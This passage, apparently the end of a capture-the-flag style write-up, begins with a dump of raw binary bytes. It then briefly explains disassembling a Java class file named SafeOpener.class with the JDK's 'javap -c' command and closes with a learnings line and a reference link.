�.4>EKPq␦���K,'(�!␦!+,b-1_23[43 X567� 89:;;�V<= >? uL*+��
                    "#&'"@323�;AB0
.J/

~~~

But there is an alternative method of course where you actually decompile the file, so I researched on how to decompile the file and got to know how to do it using JDK(installed this when I downloaded Ghidra)


~~~
javap -c SafeOpener.class
~~~


![image](https://github.com/user-attachments/assets/07abce9e-3934-4e7e-a366-3e5581a3163b)


Learnings:
Learnt how to decompile a java class file

References:
https://www.javatpoint.com/java-decompiler

